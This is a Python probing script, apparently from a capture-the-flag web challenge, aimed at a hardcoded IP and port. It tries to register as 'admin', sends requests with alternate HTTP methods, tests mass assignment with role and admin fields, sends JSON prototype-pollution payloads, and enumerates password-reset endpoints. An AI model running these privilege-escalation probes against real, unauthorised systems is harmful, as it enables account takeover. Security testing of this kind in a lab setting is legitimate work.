import requests
import re

base = 'http://154.57.164.80:31506'

# Let me re-examine this challenge carefully
# 1. HTML is rendered unescaped in messages
# 2. CSP blocks inline scripts
# 3. Cookie is HttpOnly 
# 4. No admin bot seems to be visiting

# Maybe the vulnerability is not XSS but something else:
# - CSRF (but form-action is 'self')
# - Mass assignment / prototype pollution
# - SQLi in the messages/search
# - IDOR via different methods
# - Session fixation
# - Cookie manipulation

# Let me look at what happens with:
# 1. The register endpoint - can we re-register as admin?
# 2. Password reset functionality
# 3. Mass assignment - extra fields

s = requests.Session()

# Try re-registering as admin
print("=== TRYING TO RE-REGISTER AS ADMIN ===")
r = s.post(f'{base}/register', data={'username': 'admin', 'password': 'mypass123'}, allow_redirects=False)
print(f"Status: {r.status_code}")
print(f"Location: {r.headers.get('Location', '')}")
print(f"Body: {r.text[:500]}")

# Try with different HTTP methods
print("\n=== TRYING DIFFERENT METHODS ON REGISTER ===")
for method in ['PUT', 'PATCH']:
    r = s.request(method, f'{base}/register', data={'username': 'admin', 'password': 'mypass123'})
    print(f"  {method}: status={r.status_code}")

# Try mass assignment - adding role/admin fields
print("\n=== MASS ASSIGNMENT TESTS ===")
mass_payloads = [
    {'username': 'masstest1', 'password': 'pass123', 'role': 'admin'},
    {'username': 'masstest2', 'password': 'pass123', 'isAdmin': 'true'},
    {'username': 'masstest3', 'password': 'pass123', 'admin': 'true'},
    {'username': 'masstest4', 'password': 'pass123', 'is_admin': '1'},
]

for payload in mass_payloads:
    s2 = requests.Session()
    r = s2.post(f'{base}/register', data=payload, allow_redirects=False)
    if r.status_code == 302 and r.headers.get('Location') == '/':
        # Login and check if we have admin access
        s2.post(f'{base}/login', data={'username': payload['username'], 'password': 'pass123'})
        r2 = s2.get(f'{base}/')
        print(f"  Payload {payload}: registered OK")
        if 'admin' in r2.text.lower() and 'Admin' not in r2.text:
            print(f"    May have admin access! Body: {r2.text[:500]}")

# Try JSON registration
print("\n=== JSON REGISTRATION WITH EXTRA FIELDS ===")
json_payloads = [
    {'username': 'jsontest1', 'password': 'pass123', 'role': 'admin'},
    {'username': 'jsontest2', 'password': 'pass123', '__proto__': {'role': 'admin'}},
    {'username': 'jsontest3', 'password': 'pass123', 'constructor': {'prototype': {'role': 'admin'}}},
]

for payload in json_payloads:
    s3 = requests.Session()
    r = s3.post(f'{base}/register', json=payload, allow_redirects=False)
    print(f"  JSON {list(payload.keys())}: status={r.status_code} loc={r.headers.get('Location', '')}")
    if r.status_code == 302 and r.headers.get('Location') == '/':
        r2 = s3.get(f'{base}/')
        print(f"    Inbox: {r2.text[:300]}")

# Check if the message has some hidden content or links we missed
# Try viewing message with raw response
print("\n=== CHECKING RAW MESSAGE HEADERS ===")
s4 = requests.Session()
s4.post(f'{base}/login', data={'username': 'testuser1', 'password': 'testpass123'})
r = s4.get(f'{base}/messages/10')
print(f"Headers: {dict(r.headers)}")

# Check if there's something at /messages/new with pre-populated params
print("\n=== CHECKING COMPOSE WITH PARAMS ===")
r = s4.get(f'{base}/messages/new?to=admin')
print(f"Compose with to=admin: {r.text[:500]}")

# Check for password reset
print("\n=== PASSWORD RESET/CHANGE ENDPOINTS ===")
for path in ['/forgot-password', '/reset-password', '/change-password', '/password', '/account']:
    r = s4.get(f'{base}{path}', allow_redirects=False)
    if r.status_code != 404:
        print(f"  {path}: {r.status_code}")
